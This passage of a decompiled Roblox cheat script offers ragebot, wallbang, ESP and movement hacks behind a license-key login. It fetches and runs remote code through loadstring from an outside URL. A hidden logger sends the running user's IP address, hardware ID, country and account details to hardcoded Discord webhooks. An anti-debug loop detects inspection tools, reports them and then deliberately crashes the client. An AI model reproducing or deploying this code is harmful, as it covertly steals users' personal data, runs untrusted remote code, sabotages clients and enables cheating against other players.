-- Luraph runtime function (from the VM object, not part of the script: not lifted).
-- LPH_ENCFUNC decrypts a function this way: (key, encrypted buffer, ...) -> function.
local function luraph_runtime1(...)
	error("Luraph runtime function, not devirtualized")
end

pcall(setfpscap, 2000)

repeat
	Wait()
until game:IsLoaded()

GetService = function(D)return cloneref(game:GetService(D));end
Game = game
Tick = tick
IsA = function(D,H)if D==nil then return false;end;return D:IsA(H);end
Clone = Game.Clone
Destroy = Game.Destroy
WaitForChild = Game.WaitForChild
GetChildren = Game.GetChildren
GetDescendants = Game.GetDescendants
IsDescendantOf = function(D,H)if D==nil or H==nil then return false;end;return D:IsDescendantOf(H);end
FindFirstChild = Game.FindFirstChild
FindFirstChildOfClass = Game.FindFirstChildOfClass
FindFirstChildWhichIsA = Game.FindFirstChildWhichIsA
GetPropertyChangedSignal = Game.GetPropertyChangedSignal
Type = type
GetGc = getgc
Date = os.date
TypeOf = typeof
RawGet = rawget
Clock = os.clock
CloneRef = cloneref
CheckCaller = checkcaller
HookFunction = hookfunction
HookMetaMethod = hookmetamethod
GetCallingScript = getcallingscript
GetNamecallMethod = getnamecallmethod
NewUDim = UDim.new
NewUDim2 = UDim2.new
NewCFrame = CFrame.new
NewVector2 = Vector2.new
NewVector3 = Vector3.new
NewDrawing = Drawing.new
NewInstance = Instance.new
NewTweenInfo = TweenInfo.new
NewFont = Font.new
NewRect = Rect.new
Angles = CFrame.Angles
NewRayParams = RaycastParams.new
NewColor3 = Color3.new
NewRGB = Color3.fromRGB
FromHSV = Color3.fromHSV
FromHex = Color3.fromHex
White = NewRGB(255, 255, 255)
EmptyCFrame = NewCFrame()
EmptyUDim = NewUDim(0, 0)

EmptyFunction = function()
end

EmptyVector2 = NewVector2(0, 0)
EmptyUDim2 = NewUDim2(0, 0, 0, 0)
EmptyVector3 = NewVector3(0, 0, 0)
Dot = EmptyVector3.Dot
PointToObjectSpace = EmptyCFrame.PointToObjectSpace
Sub = string.sub
GSub = string.gsub
Lower = string.lower
Split = string.split
Match = string.match
Format = string.format
StringFind = string.find
Wait = task.wait
Spawn = task.spawn
Delay = task.delay
Cancel = task.cancel
Sort = table.sort
Find = table.find
Clear = table.clear
Remove = table.remove
Unpack = table.unpack
Concat = table.concat
Insert = table.insert
Pi = 3.1415926535897931
Sin = math.sin
Cos = math.cos
Abs = math.abs
Tan = math.tan
Min = math.min
Max = math.max
Rad = math.rad
Ceil = math.ceil
Acos = math.acos
Sqrt = math.sqrt
Huge = math.huge
Round = math.round
Clamp = math.clamp
Atan2 = math.atan2
Floor = math.floor
NewRandom = Random.new
Random = math.random
Infinite = math.huge
ToRad = Pi / 180
TwoPi = Pi * 2
Stats = GetService("Stats")
Players = GetService("Players")
CoreGui = GetService("CoreGui")
Lighting = GetService("Lighting")
Workspace = GetService("Workspace")
Debris = GetService("Debris")
RunService = GetService("RunService")
StarterGui = GetService("StarterGui")
GuiService = GetService("GuiService")
TextService = GetService("TextService")
HttpService = GetService("HttpService")
TweenService = GetService("TweenService")
SoundService = GetService("SoundService")
TeleportService = GetService("TeleportService")
TextChatService = GetService("TextChatService")
UserInputService = GetService("UserInputService")
ReplicatedStorage = GetService("ReplicatedStorage")
PathfindingService = GetService("PathfindingService")
Raycast = Workspace.Raycast
SetCore = StarterGui.SetCore
Stepped = RunService.Stepped
GetPlayers = Players.GetPlayers
Heartbeat = RunService.Heartbeat
LocalPlayer = Players.LocalPlayer
JSONDecode = HttpService.JSONDecode
JSONEncode = HttpService.JSONEncode
GetGuiInset = GuiService.GetGuiInset
CurrentCamera = Workspace.CurrentCamera
RenderStepped = RunService.RenderStepped
PreSimulation = RunService.PreSimulation
GetMouseLocation = UserInputService.GetMouseLocation
Connect = function(D,H)return D:Connect(H);end

GetAttribute = function(arg, arg2)
	if arg == nil then
		return nil
	end
	return arg:GetAttribute(arg2)
end

SetAttribute = function(arg, arg2, arg3)
	if arg == nil then
		return
	end
	arg:SetAttribute(arg2, arg3)
end

Disconnect = function(arg)
	if arg == nil then
		return
	end
	arg:Disconnect()
end

if getconnections then
	GetConnections = getconnections
end

PlayerScripts = WaitForChild(LocalPlayer, "PlayerScripts")
Teams = GetService("Teams")
UserService = GetService("UserService")
ReplicatedFirst = GetService("ReplicatedFirst")
CollectionService = GetService("CollectionService")
MarketplaceService = GetService("MarketplaceService")
IsOnMobile = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled or false
oldTI = getthreadidentity() or 8

if getconnections then
	local v = next
	local v2, v3 = GetConnections(LocalPlayer.Idled)

	for _, v4 in v, v2, v3 do
		Disconnect(v4)
	end
else
	Connect(LocalPlayer.Idled, function()GetService("VirtualUser"):CaptureController();GetService("VirtualUser"):ClickButton2(NewVector2());end)
end

TextChatService.ChatWindowConfiguration.Enabled = true
Connect(GetPropertyChangedSignal(TextChatService.ChatWindowConfiguration, "Enabled"), function()if TextChatService.ChatWindowConfiguration.Enabled~=true then TextChatService.ChatWindowConfiguration.Enabled=true;end;end)
Spawn(function()pcall(function()ReplicatedFirst.ChatFilter.Disabled=true;end);end)
local currentCamera = workspace.CurrentCamera
local function fn(D,H)return Connect(D,H);end
FindFirstAncestorOfClass = function(D,H)if D==nil then return nil;end;return D:FindFirstAncestorOfClass(H);end
IsAncestorOf = function(D,H)if D==nil or H==nil then return false;end;return D:IsAncestorOf(H);end
RaycastWorkspace = function(D,H,m)return Raycast(Workspace,D,H,m);end
BindCamera = function(...) end
UpdateFrustum = function(...) end
WorldToViewport = function(...) end
LookAngle = function(D,H,m)local h=m-H;if h.Magnitude<0.001 then return 0;end;return Acos(Clamp(Dot(D,h.Unit),-1,1))*2;end
BindLocalCharacter = function(...) end
BindCharacterCache = function(D,H)D.Character=H;D.RootPart=nil;D.Humanoid=nil;D.Head=nil;if not H then return;end;D.RootPart=FindFirstChild(H,"HumanoidRootPart");D.Head=FindFirstChild(H,"Head");D.Humanoid=FindFirstChildOfClass(H,"Humanoid");end
GetPlayerList = function()return GetPlayers(Players);end
MouseLocation = function()return GetMouseLocation(UserInputService);end
Camera = function(...) end
GetScreenX = function(...) end
GetScreenY = function(...) end
GetLocalHumanoid = function(...) end
GetLocalRoot = function(...) end
GetLocalCharacter = function(...) end
UpdateFovCircle = function(D,H,m,h)if D.Visible~=H then D.Visible=H;end;if not H then return;end;H=White;if D.Color~=H then D.Color=H;end;if D.Position~=h then D.Position=h;end;if D.Radius~=m then D.Radius=m;end;end
BindCamera(currentCamera)
fn(GetPropertyChangedSignal(workspace, "CurrentCamera"), function()BindCamera(workspace.CurrentCamera);end)
BindLocalCharacter(LocalPlayer.Character)
fn(LocalPlayer.CharacterAdded, function(D)BindLocalCharacter(D);end)
fn(LocalPlayer.CharacterRemoving, function()end)
local lib = loadstring(game:HttpGet("https://cnb.cool/MoonLua/Adnonis/-/git/raw/main/Bypass"))()

if lib.Detect() then
	lib.Bypass()
end

local function fn2(arg, arg2)
	local v = LocalPlayer

	local function fn3()
		if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
			return "Mobile"
		end

		if UserInputService.KeyboardEnabled then
			return "PC"
		end

		if UserInputService.GamepadEnabled then
			return "Console"
		end
		return "Unknown"
	end

	local str

	if identifyexecutor then
		str = identifyexecutor()
	elseif syn then
		str = "Synapse X"
	elseif KRNL_LOADED then
		str = "Krnl"
	elseif fluxus then
		str = "Fluxus"
	elseif is_sirhurt_closure then
		str = "SirHurt"
	else
		str = "Unknown"

		if OXYGEN then
			str = "Oxygen U"
		end
	end

	local str2 = "Unavailable"

	pcall(function()
		str2 = tostring(GetService("RbxAnalyticsService"):GetClientId())
	end)

	local str3 = "Unknown"

	pcall(function()
		local productInfo = MarketplaceService:GetProductInfo(game.PlaceId)

		if productInfo and productInfo.Name then
			str3 = productInfo.Name
		end
	end)

	local str4 = "Unknown"

	pcall(function()
		str4 = tostring(GetService("LocalizationService"):GetCountryRegionForPlayerAsync(v) or "Unknown")
	end)

	local str5 = "Unavailable"

	pcall(function()
		local response = game:HttpGet("https://api.ipify.org")

		if response and response ~= "" then
			str5 = response
		end
	end)

	local str6 = "Unknown"
	local str7 = "Free"

	pcall(function()
		str6 = tostring(v.AccountAge) .. " days"
		str7 = v.MembershipType == Enum.MembershipType.Premium and "Premium" or "Free"
	end)

	local tbl = {
		avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(v.UserId) .. "&width=150&height=150&format=png",
		content = arg2 or "",
		username = "Roblox Logger",
	}

	local tbl2 = {
		name = "Game Info",
		value = "Game Name: " .. str3 .. "\nPlace ID: " .. game.PlaceId .. "\nJob ID: " .. game.JobId,
		inline = false,
	}

	tbl.embeds = {
		{
			title = "Script Execution Report",
			color = 3447003,
			author = {
				name = v.Name,
				icon_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(v.UserId) .. "&width=150&height=150&format=png",
			},
			thumbnail = {
				url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(v.UserId) .. "&width=420&height=420&format=png",
			},
			fields = {
				{
					name = "User Info",
					value = "Username: " .. v.Name .. "\nUser ID: " .. v.UserId .. "\nPlatform: " .. fn3(),
					inline = false,
				},
				{
					name = "Executor Info",
					value = "Executor: " .. str .. "\nVersion: " .. "N/A" .. "\nHWID: " .. str2,
					inline = false,
				},
				tbl2,
				{
					name = "Network Info",
					value = "IP Address: " .. str5 .. "\nRegion: " .. str4,
					inline = false,
				},
				{
					name = "Account Info",
					value = "Account Age: " .. str6 .. "\nMembership: " .. str7,
					inline = false,
				},
			},
			footer = { text = "User ID: " .. tostring(v.UserId) },
			timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
		},
	}

	local ok, result = pcall(function()
		return HttpService:JSONEncode(tbl)
	end)

	if not ok then
		print("JSON encoding failed")
		return
	end
	local request_ = syn and syn.request or request or http_request
	if not request_ then
		print("Error: no request (syn.request / request / http_request)")
		return
	end
	local v2 = request_({ Url = arg, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = result })

	if v2 then
		if not (v2.StatusCode == 200 or v2.StatusCode == 204) then
			print("Webhook error:", v2.StatusCode)

			if v2.Body then
				print("Response:", v2.Body)
			end
		end
	else
		print("ERROR: No response from server")
	end
end

local function fn3()
end

local function fn4()
end

local function fn5()
end

local v = hookfunction

local v2 = luraph_runtime1(function()
end)

v(fn3, v2)
local v3 = hookfunction

local v4 = luraph_runtime1(function()
end)

v3(fn4, v4)
local v5 = hookfunction

local v6 = luraph_runtime1(function()
end)

v5(fn5, v6)

Spawn(function()
	local flag = false
	local str = ""

	while true do
		if SCRIPT_KEY == "D022048F29" then
			return
		else
			GetService("LogService"):ClearOutput()

			if FindFirstChild(CoreGui, "DevConsoleMaster") then
				str ..= "detected DevConsoleMaster "
				CoreGui.DevConsoleMaster:Destroy()
				flag = true
			end

			if dtspy or getgenv().CobaltInitialized or getgenv().SimpleSpyExecuted then
				str ..= "detected spy "
				flag = true
			end

			if not isfunctionhooked(fn3) or not isfunctionhooked(fn4) or not isfunctionhooked(fn5) then
				str ..= "hookmetamethod isfunctionhooked "
				flag = true
			end

			if isfunctionhooked(loadstring) then
				str ..= "hookmetamethod loadstring "
				flag = true
			end

			if isfunctionhooked(game.HttpGet) then
				str ..= "hookmetamethod game.HttpGet "
				flag = true
			end

			if isfunctionhooked(request) then
				str ..= "hookmetamethod request "
				flag = true
			end

			if isfunctionhooked(game.HttpGet) then
				str ..= "hookmetamethod HttpGet "
				flag = true
			end

			if isfunctionhooked(getrawmetatable) then
				str ..= "hookmetamethod getrawmetatable "
				flag = true
			end

			if isfunctionhooked(Players.LocalPlayer.Kick) then
				str ..= "hookmetamethod Kick "
				flag = true
			end

			if isfunctionhooked(HttpService.GetAsync) then
				str ..= "hookmetamethod GetAsync "
				flag = true
			end

			if isfunctionhooked(HttpService.JSONDecode) then
				str ..= "hookmetamethod JSONDecode "
				flag = true
			end

			if isfunctionhooked(Players.LocalPlayer.IsInGroup) then
				str ..= "hookmetamethod IsInGroup "
				flag = true
			end

			if isfunctionhooked(HttpService.RequestAsync) then
				str ..= "hookmetamethod RequestAsync "
				flag = true
			end

			if isfunctionhooked(HttpService.PostAsync) then
				str ..= "hookmetamethod PostAsync "
				flag = true
			end

			if flag then
				break
			end
			Wait(3)
		end
	end

	pcall(fn2, "https://discord.com/api/webhooks/1501722704871690392/lwlnk748HLcSVL2lpvDsVM5jHl1i3fUWaS0Z3wN3Lk4bvaaJOuqdAOIndARsvvXhqDgz", SCRIPT_KEY .. " " .. str)
	Wait(5)

	while true do
		pcall(function()
			for i = 1, 1000 do
				for k in pairs(GetDescendants(game)) do
					NewInstance("Part", workspace)
				end
			end
		end)

		Wait()
	end
end)

local tbl = { APPID = "22468", VERSION = "1.1", KEY = SCRIPT_KEY or "" }
tbl.HWID = GetService("RbxAnalyticsService"):GetClientId()
tbl.NOTICE = ""
tbl.TOKEN = ""
tbl.kmlogon = "http://wy.llua.cn/api/?id=kmlogon&app=" .. tbl.APPID
tbl.notice = "http://wy.llua.cn/api/?id=notice&app=" .. tbl.APPID
tbl.heartbeat = "http://wy.llua.cn/api/?id=heartbeat&app=" .. tbl.APPID .. "&kami=" .. tbl.KEY .. "&markcode=" .. tbl.HWID .. "&token="

local function fn6(arg, arg2, duration)
	print(arg, arg2)
	local tbl2 = { Title = arg, Text = tostring(arg2) }

	if duration then
		tbl2.Duration = duration
	end

	GetService("StarterGui"):SetCore("SendNotification", tbl2)
end

local v7 = HttpService

local ok, result = pcall(function()
	return request({ Url = tbl.kmlogon, Method = "GET" })
end)

if not ok then
	fn6("版本检查失败", result)

	while true do
		Wait()
	end
else
	local data = v7:JSONDecode(result.Body)

	if not data then
		fn6("版本检查失败", "返回数据解析失败")

		while true do
			Wait()
		end
	else
		local version = data.version
		local appUpdateShow = data.app_update_show or "发现新版本，请更新后使用"
		local appUpdateUrl = data.app_update_url or ""

		if not version and type(data.msg) == "table" then
			version = data.msg.version
		end

		if version and tostring(version) ~= tostring(tbl.VERSION) then
			if appUpdateUrl ~= "" then
				appUpdateShow ..= "\n下载地址已复制到剪贴板"

				pcall(function()
					setclipboard(appUpdateUrl)
				end)
			end

			fn6("需要更新", appUpdateShow, 10)

			while true do
				Wait()
			end
		else
			local ok2, result2 = pcall(function()
				return request({ Url = tbl.notice, Method = "GET" })
			end)

			if ok2 and result2 and result2.Body then
				local data2 = v7:JSONDecode(result2.Body)

				if data2 and tonumber(data2.code) == 200 then
					local msg = data2.msg
					local appGg

					if type(msg) == "table" and msg.app_gg ~= nil then
						appGg = msg.app_gg
					else
						appGg = nil

						if data2.app_gg ~= nil then
							appGg = data2.app_gg
						end
					end

					if appGg ~= nil then
						tbl.NOTICE = appGg
					end
				end
			end

			local str = tbl.kmlogon .. "&kami=" .. tbl.KEY .. "&markcode=" .. tbl.HWID

			local ok3, result3 = pcall(function()
				return request({ Url = str, Method = "GET" })
			end)

			if ok3 then
				local data2 = v7:JSONDecode(result3.Body)

				if data2 then
					if data2.code == 200 and data2.msg and data2.msg.vip then
						fn6("Login Success", "Expire " .. os.date("%Y-%m-%d %H:%M:%S", data2.msg.vip))

						if data2.msg.token then
							tbl.TOKEN = data2.msg.token
						end
					elseif tostring(data2.msg) then
						fn6("Login Failed1", data2.msg)

						while true do
							Wait()
						end
					end

					Spawn(function()
						while true do
							Wait(10)

							local ok4, result4 = pcall(function()
								return request({ Url = tbl.heartbeat .. tbl.TOKEN, Method = "GET" })
							end)

							if ok4 then
								local data3 = HttpService:JSONDecode(result4.Body)
								if not data3 then
									continue
								end

								if data3.code == 200 then
									continue
								end

								pcall(function()
									for i = 1, 1000 do
										for k in pairs(GetDescendants(game)) do
											NewInstance("Part", workspace)
										end
									end
								end)
							end
						end
					end)

					Spawn(fn2, "https://discord.com/api/webhooks/1501413669739958313/_uortqJa4RSs27Eb4STj9pElnkSJD4bAVb8F5hfclJPcUo29Q1755I6va7gwvpTCz8ji", SCRIPT_KEY)
					local v8 = (function(...) end)()
					hitlogEnabled = true
					local v9 = TweenService
					local v10 = CoreGui
					local v11 = Format
					local v12 = NewInstance

					local tbl2 = {
						Middle = NewUDim2(0.445, 0, 0.7, 0),
						MiddleRight = NewUDim2(0.85, 0, 0.7, 0),
						MiddleLeft = NewUDim2(0.01, 0, 0.7, 0),
						Top = NewUDim2(0.445, 0, 0.007, 0),
						TopLeft = NewUDim2(0.06, 0, 0.001, 0),
						TopRight = NewUDim2(0.8, 0, 0.001, 0),
					}

					protectScreenGui = function(H)if syn and syn.protect_gui then syn.protect_gui(H);H.Parent= v10 ;elseif gethui then H.Parent=gethui();else H.Parent= v10 ();end;end
					createObject = function(H,m)local h= v12 (H);for D,H in next,m,nil do h[D]=H;end;return h;end
					fadeObject = function(H,m)local h= v9 :Create(H,TweenInfo.new(0.3,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut),{TextTransparency=1,TextStrokeTransparency=1});Connect(h.Completed,m);h:Play();end
					local tbl3

					tbl3 = {
						new = function(H)assert(H,"missing argument #1 in function notifications.new(settings)");assert(typeof(H)=="table", v11 ("expected table for argument #1 in function notifications.new(settings), got %s",typeof(H)));local m={ui={notificationsFrame=nil,notificationsFrame_UIListLayout=nil}};for h,B in next,H,nil do m[h]=B;end;setmetatable(m,{__index= tbl3 });return m;end,
						SetNotificationLifetime = function(H,m)assert(m,"missing argument #1 in function SetNotificationLifetime(number)");assert(typeof(m)=="number", v11 ("expected number for argument #1 in function SetNotificationLifetime, got %s",typeof(m)));H.NotificationLifetime=m;end,
						SetTextColor = function(H,m)assert(m,"missing argument #1 in function SetTextColor(Color3)");assert(typeof(m)=="Color3", v11 ("expected Color3 for argument #1 in function SetTextColor3, got %s",typeof(m)));H.TextColor=m;end,
						SetTextSize = function(H,m)assert(m,"missing argument #1 in function SetTextSize(number)");assert(typeof(m)=="number", v11 ("expected number for argument #1 in function SetTextSize, got %s",typeof(m)));H.TextSize=m;end,
						SetTextStrokeTransparency = function(H,m)assert(m,"missing argument #1 in function SetTextStrokeTransparency(number)");assert(typeof(m)=="number", v11 ("expected number for argument #1 in function SetTextStrokeTransparency, got %s",typeof(m)));H.TextStrokeTransparency=m;end,
						SetTextStrokeColor = function(H,m)assert(m,"missing argument #1 in function SetTextStrokeColor(Color3)");assert(typeof(m)=="Color3", v11 ("expected Color3 for argument #1 in function SetTextStrokeColor, got %s",typeof(m)));H.TextStrokeColor=m;end,
						SetTextFont = function(D,H)assert(H,"missing argument #1 in function SetTextFont(Font)");assert(typeof(H)=="string"or typeof(H)=="EnumItem");D.TextFont=Enum.Font[H];end,
						BuildNotificationUI = function(H)if notifications_screenGui then notifications_screenGui:Destroy();end;getgenv().notifications_screenGui=createObject("ScreenGui",{ZIndexBehavior=Enum.ZIndexBehavior.Sibling});protectScreenGui(notifications_screenGui);H.ui.notificationsFrame=createObject("Frame",{Name="notificationsFrame",Parent=notifications_screenGui,BackgroundColor3=NewRGB(255,255,255),BackgroundTransparency=1,Position= tbl2 [H.NotificationPosition],Size=NewUDim2(0,236,0,215)});H.ui.notificationsFrame_UIListLayout=createObject("UIListLayout",{Name="notificationsFrame_UIListLayout",Parent=H.ui.notificationsFrame,Padding=NewUDim(0,1),SortOrder=Enum.SortOrder.LayoutOrder});end,
						Notify = function(D,H)local m=createObject("TextLabel",{Name="notification",Parent=D.ui.notificationsFrame,BackgroundColor3=NewRGB(255,255,255),BackgroundTransparency=1,Size=NewUDim2(0,222,0,14),Text=H,Font=D.TextFont,TextColor3=D.TextColor,TextSize=D.TextSize,TextStrokeColor3=D.TextStrokeColor,TextStrokeTransparency=D.TextStrokeTransparency});Delay(D.NotificationLifetime,function()fadeObject(m,function()m:Destroy();end);end);end,
					}

					local v13 = tbl3.new({
						NotificationLifetime = 3,
						NotificationPosition = "Middle",
						TextFont = Enum.Font.Code,
						TextColor = NewRGB(255, 255, 255),
						TextSize = 15,
						TextStrokeTransparency = 0,
						TextStrokeColor = NewRGB(0, 0, 0),
					})

					v13:BuildNotificationUI()
					hitlog = function(H)if not hitlogEnabled then return;end; v13 :Notify(H);end

					local v14 = v8:CreateWindow({
						Title = "Moon",
						Version = "Lua",
						Theme = "Gothic",
						SearchTab = { Id = "tab-search", Name = "Search", Kind = "Search" },
						ConfigFolder = "Rise/Configs",
						Translations = {
							["Ability Aura"] = "技能光环",
							["allow-block-stomp"] = "允许格挡踩踏",
							["Anti Grab"] = "反抓取",
							["anti-grab"] = "反抓取",
							["anti-ragdoll"] = "防布娃娃",
							["autoload-manual-load"] = "手动加载",
							["Balloon → Balloon"] = "气球 → 气球",
							["Balloon → Bat Balloon"] = "气球 → 蝙蝠气球",
							["Balloon → Black Rose"] = "气球 → 黑玫瑰",
							["Balloon → Bunny Balloon"] = "气球 → 兔子气球",
							["Balloon → Clover Balloon"] = "气球 → 四叶草气球",
							["Balloon → Dollar Balloon"] = "气球 → 美金气球",
							["Balloon → Ghost Balloon"] = "气球 → 幽灵气球",
							["Balloon → Gold Clover Balloon"] = "气球 → 金四叶草气球",
							["Balloon → Golden Rose"] = "气球 → 金玫瑰",
							["Balloon → Heart Balloon"] = "气球 → 爱心气球",
							["Balloon → Kunai"] = "气球 → 苦无",
							["Balloon → Rainbow Umbrella"] = "气球 → 彩虹雨伞",
							["Balloon → Skull Balloon"] = "气球 → 骷髅气球",
							["Balloon → Snowflake Balloon"] = "气球 → 雪花气球",
							["Balloon → Spirit Kunai"] = "气球 → 灵魂苦无",
							["Balloon → Umbrella"] = "气球 → 雨伞",
							["Beautify Items"] = "美化物品",
							blackout = "Blackout",
							["blackout-auto-skip-shop"] = "自动跳过商店",
							["blackout-melee-killaura"] = "近战光环",
							["blackout-no-fall-damage"] = "无摔伤",
							["blackout-no-ragdoll"] = "无布娃娃",
							["blackout-ragebot"] = "愤怒机器人",
							blackout_ragebot_ignore_npc = "忽略 NPC",
							blackout_ragebot_wallbang = "穿墙射击",
							["block-spin-bypass-jump-check"] = "绕过跳跃检测",
							["block-spin-fast-stamina-regen"] = "快速体力回复",
							["block-spin-melee-aura"] = "近战光环",
							["block-spin-move"] = "移动",
							["block-spin-rage"] = "愤怒",
							["Candy Cane → Blue Candy Cane"] = "糖果棒 → 蓝糖果棒",
							["Carry Abuse"] = "携带滥用",
							["Combat Switch"] = "允许战斗换角色",
							["criminality-anti-stun-grenade"] = "防眩晕手雷",
							["criminality-auto-farm"] = "自动农场",
							["criminality-auto-respawn"] = "自动重生",
							["criminality-crack-reg"] = "撬收银机",
							["criminality-crack-save"] = "撬保险箱",
							["criminality-farm-aura"] = "农场光环",
							["criminality-fast-acceleration"] = "快速加速",
							["criminality-inf-stamina"] = "无限体力",
							["criminality-melee-aura-ignore-downed"] = "忽略倒地",
							["criminality-misc"] = "Criminality 杂项",
							["criminality-money"] = "金钱",
							["criminality-no-fall"] = "无摔伤",
							["criminality-radius"] = "半径",
							["criminality-rage"] = "Criminality 愤怒",
							["criminality-rage-aim-no-recoil-spread"] = "无后坐/扩散",
							["criminality-rage-anti-aim"] = "反自瞄",
							["criminality-rage-anti-aim- head-yaw"] = "头偏航",
							["criminality-rage-anti-aim-arm-pitch"] = "手臂俯仰",
							["criminality-rage-anti-aim-hand-mode"] = "手部模式",
							["criminality-rage-anti-aim-head-pitch"] = "头俯仰",
							["criminality-rage-anti-aim-head-pitch-mode"] = "头俯仰模式",
							["criminality-rage-anti-aim-head-yaw-mode"] = "头偏航模式",
							["criminality-rage-anti-aim-only-with-tool"] = "仅持械",
							["criminality-rage-anti-aim-spin-speed"] = "旋转速度",
							["criminality-rage-auto-repair"] = "自动修理",
							["criminality-rage-looptp"] = "循环传送",
							["criminality-rage-looptp-keybind"] = "按键",
							["criminality-rage-magic-projectile"] = "魔法弹道",
							["criminality-rage-magic-projectile-fov"] = "视野",
							["criminality-rage-magic-projectile-keybind"] = "按键",
							["criminality-rage-magic-projectile-use-fov"] = "使用范围",
							["criminality-rage-magic-projectile-wallbang"] = "穿墙射击",
							["criminality-rage-melee-aura"] = "近战光环",
							["criminality-rage-melee-aura-keybind"] = "按键",
							["criminality-rage-melee-aura-radius"] = "半径",
							["criminality-rage-melee-aura-show-anim"] = "显示动画",
							["criminality-rage-ragebot"] = "愤怒机器人",
							["criminality-rage-ragebot-auto-reload"] = "自动换弹",
							["criminality-rage-ragebot-delay"] = "延迟",
							["criminality-rage-ragebot-fov"] = "视野",
							["criminality-rage-ragebot-hit-radius"] = "命中半径",
							["criminality-rage-ragebot-ignore-downed"] = "忽略倒地",
							["criminality-rage-ragebot-instant-reload"] = "瞬间换弹",
							["criminality-rage-ragebot-keybind"] = "按键",
							["criminality-rage-ragebot-origin-radius"] = "原点半径",
							["criminality-rage-ragebot-shot-gun-range"] = "霰弹范围",
							["criminality-rage-ragebot-use-fov"] = "使用范围",
							["criminality-rage-ragebot-wallbang"] = "穿墙射击",
							["criminality-scrap"] = "废料",
							["criminality-speed"] = "速度",
							["criminality-tool"] = "工具",
							["Damage Boost"] = "伤害加强",
							["Dash Patch"] = "冲刺修补",
							Death = "死亡",
							defusal = "拆弹",
							["defusal-no-smoke"] = "无烟雾",
							["defusal-ragebot"] = "愤怒机器人",
							["defusal-ragebot-delay"] = "延迟",
							["defusal-ragebot-keybind"] = "按键",
							["defusal-ragebot-wallbang"] = "穿墙射击",
							Delay = "延迟",
							Dragon = "龙套",
							["Endless Ult"] = "延长大招",
							["ESP.Config.BlacklistColor"] = "黑名单颜色",
							["ESP.Config.Box_Type"] = "方框类型",
							["ESP.Config.BoxColor"] = "方框颜色",
							["ESP.Config.Boxes"] = "方框",
							["ESP.Config.Chams"] = "上色",
							["ESP.Config.ChamsInline"] = "填充",
							["ESP.Config.ChamsInlineAlpha"] = "填充透明度",
							["ESP.Config.ChamsInlineColor"] = "填充颜色",
							["ESP.Config.ChamsInlineSize"] = "填充大小",
							["ESP.Config.ChamsOutline"] = "描边",
							["ESP.Config.ChamsOutlineAlpha"] = "描边透明度",
							["ESP.Config.ChamsOutlineColor"] = "描边颜色",
							["ESP.Config.ChamsOutlineSize"] = "描边大小",
							["ESP.Config.Distance"] = "距离",
							["ESP.Config.Flags"] = "标记",
							["ESP.Config.Font"] = "字体",
							["ESP.Config.Health"] = "生命",
							["ESP.Config.HealthBar"] = "生命条",
							["ESP.Config.HealthHighColor"] = "满血颜色",
							["ESP.Config.HealthLowColor"] = "残血颜色",
							["ESP.Config.Name"] = "名称",
							["ESP.Config.OnlyEnemy"] = "仅敌人",
							["ESP.Config.Tool"] = "工具",
							["ESP.Config.WhitelistColor"] = "白名单颜色",
							["Fake Lag"] = "虚假延迟",
							["Fake Lag Interval"] = "虚假延迟间隔",
							["Fast Attack"] = "快速攻击",
							gakuran = "学兰",
							["gakuran-auto-parry"] = "自动格挡",
							["gakuran-auto-parry-anim-progress"] = "动画进度(%)",
							["gakuran-auto-parry-attack-distance"] = "攻击距离",
							["gakuran-auto-parry-auto-equip"] = "自动装备",
							["gakuran-auto-parry-face-angle"] = "面向角度(度)",
							["gakuran-auto-parry-face-target"] = "面向攻击者",
							["gakuran-auto-parry-range"] = "范围",
							["gakuran-auto-parry-visuals"] = "视觉",
							["gakuran-inf-stamina"] = "无限体力",
							["gakuran-instant-respawn"] = "瞬重生",
							["gakuran-instant-respawn-hp"] = "生命阈值",
							["gakuran-no-block-cd"] = "攻击时闪避",
							["gakuran-no-guardbroken"] = "无破防",
							["gakuran-no-perfectblocked"] = "无完美格挡",
							["gakuran-no-screen-blur"] = "无屏幕模糊",
							["gakuran-no-stun"] = "无硬直",
							["gakuran-no-suppressblocking"] = "无压制格挡",
							["gakuran-no-windup-recovery"] = "无前摇后摇",
							Godmode = "无敌",
							Gon = "小杰",
							["gun-grounds-rage"] = "愤怒",
							["gun-grounds-ffa-ragebot"] = "愤怒机器人",
							["Hide Server Output"] = "屏蔽输出（服务器）",
							["Hide Sound"] = "屏蔽音效",
							["Hide VFX"] = "屏蔽特效",
							Hitbox = "范围",
							["Instant Respawn"] = "秒复活",
							["Instant Ult"] = "大招秒变",
							["Kill Aura"] = "杀戮光环",
							["Kunai → Spirit Kunai"] = "苦无 → 灵魂苦无",
							Legit = "合法化",
							["misc-animation"] = "动画",
							["misc-animation-keybind"] = "按键",
							["misc-headless-korblox"] = "无头断腿",
							["misc-fake-player"] = "伪造玩家",
							["misc-fake-player-input"] = "用户",
							["misc-fake-player-apply"] = "伪造",
							["misc-fake-player-restore"] = "还原",
							["player-list-fake"] = "伪造",
							["player-list-blacklist"] = "黑名单",
							["player-list-whitelist"] = "白名单",
							["player-list-bring"] = "拉人",
							["player-list-looptp"] = "跟随",
							["player-list-search"] = "搜索玩家...",
							["player-list-refresh"] = "刷新",
							["tab-config"] = "配置",
							["tab-language"] = "语言",
							["tab-misc"] = "杂项",
							["tab-movement"] = "移动",
							["tab-player-list"] = "玩家列表",
							["tab-render"] = "视觉",
							["tab-search"] = "搜索",
							["tab-settings"] = "设置",
							["tab-themes"] = "主题",
							["misc-server-hop"] = "换服",
							["MiscState.Animation.Mode"] = "模式",
							Mode = "模式",
							["movement-desync"] = "假身",
							["movement-desync-keybind"] = "按键",
							["movement-desync-mode"] = "模式",
							["movement-fly"] = "飞行",
							["movement-high-jump"] = "高跳",
							["movement-noclip"] = "穿墙",
							["movement-speed"] = "速度",
							["movement-spin"] = "旋转",
							movement_desync_value = "动态包",
							movement_fly_value = "数值",
							movement_highjump_keybind = "按键",
							movement_highjump_value = "数值",
							movement_speed_keybind = "按键",
							movement_speed_value = "数值",
							movement_spin_keybind = "按键",
							movement_spin_mode = "模式",
							movement_spin_value = "数值",
							["MovementState.FlyKeybind"] = "按键",
							["MovementState.NoclipKeybind"] = "按键",
							["Multi Ult"] = "大招多用",
							nnp = "NNP",
